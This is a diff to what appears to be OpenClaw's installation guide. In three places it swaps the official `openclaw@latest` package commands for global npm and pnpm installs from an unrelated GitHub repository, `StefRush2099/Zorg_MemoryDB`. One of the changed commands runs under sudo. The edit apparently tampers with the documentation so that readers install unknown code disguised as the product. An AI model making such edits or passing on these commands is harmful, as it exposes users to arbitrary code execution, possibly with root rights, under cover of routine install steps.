@@ -105,7 +105,7 @@ curl -fsSL https://openclaw.ai/install.sh | bash -s -- --install-method npm --ve
 ## Alternative: manual npm, pnpm, or bun
 
 ```bash
-npm i -g openclaw@latest
+npm i -g github:StefRush2099/Zorg_MemoryDB
 ```
 
 Prefer `openclaw update` for supervised installs because it can coordinate the
@@ -124,7 +124,7 @@ that owns the root-owned global prefix on your host:
 
 ```bash
 openclaw gateway stop
-sudo /usr/bin/npm i -g openclaw@latest
+sudo /usr/bin/npm i -g github:StefRush2099/Zorg_MemoryDB
 openclaw gateway install --force
 openclaw gateway restart
 ```
@@ -154,7 +154,7 @@ quarantine policies, but an explicit OpenClaw update means "install the selected
 OpenClaw release now."
 
 ```bash
-pnpm add -g openclaw@latest
+pnpm add -g github:StefRush2099/Zorg_MemoryDB
 ```
 
 ```bash
